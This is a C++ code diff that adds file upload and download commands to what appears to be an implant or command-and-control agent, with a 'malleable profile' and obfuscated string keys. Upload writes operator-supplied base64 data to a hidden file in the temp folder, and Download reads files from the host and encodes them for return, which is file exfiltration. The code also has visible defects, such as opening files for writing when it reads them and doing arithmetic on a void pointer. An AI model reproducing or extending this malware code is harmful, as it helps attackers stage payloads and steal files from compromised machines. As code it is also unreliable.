@@ -1,7 +1,11 @@
+#include <windows.h>
 #include <winsock.h>
+#include <compressapi.h>
 #include "command.h"
 #include "debug.h"
 #include "profile.h"
+#include <shlwapi.h>
+#include "crypto.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
 #include "rapidjson/stringbuffer.h"
@@ -216,4 +220,67 @@ void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) 
             currentProfile->tailoringHashRounds = itr->value.GetInt();
         }
     }
+}
+
+std::string Upload(rapidjson::Value* uploaded) {
+    CHAR path [200];
+    CHAR fullPath [200];
+    std::string fileName;
+	std::string b64Contents;
+    rapidjson::Value::ConstMemberIterator itr = uploaded->MemberBegin();
+    for (; itr != uploaded->MemberEnd(); ++itr) {
+        if (itr->name == OBFUSCATED("name")) {
+            fileName = itr->value.GetString();
+        } else if (itr->name == OBFUSCATED("contents")) {
+            b64Contents = itr->value.GetString();
+        }
+    }
+    std::vector<BYTE> bytes = base64Decode(b64Contents);
+    GetTempPathA(80, path);
+    PathCombineA(fullPath, path, fileName.c_str());
+    HANDLE hFile = CreateFileA(fullPath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return "ERROR";
+    }
+
+    PSIZE_T out_size;
+
+    if (WriteFile(hFile, &bytes.at(0), sizeof(BYTE) * bytes.size(), NULL, NULL) == 0) {
+        return "ERROR";
+    }
+    return fileName;
+}
+
+std::string Download(std::string filepath) {
+    DWORD file_attr = GetFileAttributesA(filepath.c_str());
+
+    if (file_attr == INVALID_FILE_ATTRIBUTES) {
+        return "ERROR";
+    }
+    if (file_attr & FILE_ATTRIBUTE_DIRECTORY) {
+        return "DIR";
+    }
+    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return "ERROR";
+    }
+
+    LARGE_INTEGER size;
+    DWORD lower = GetFileSizeEx(hFile, &size);
+    if (size.QuadPart >= 4 * 1024 * 1024 * 1024) {
+        return "TOO BIG";
+    }
+    void* raw_buffer = malloc(size.QuadPart);
+    if (raw_buffer == NULL) {
+        return "ERROR";
+    }
+    memset(raw_buffer, 0, size.QuadPart);
+    DWORD bytes_read;
+    if (ReadFile(hFile, raw_buffer, size.QuadPart, &bytes_read, NULL) == 0) {
+        return "ERROR";
+    }
+    std::vector<BYTE> vec;
+    vec.reserve(bytes_read);
+    vec.assign(raw_buffer, raw_buffer + bytes_read);
+    return base64Encode(vec);
 }
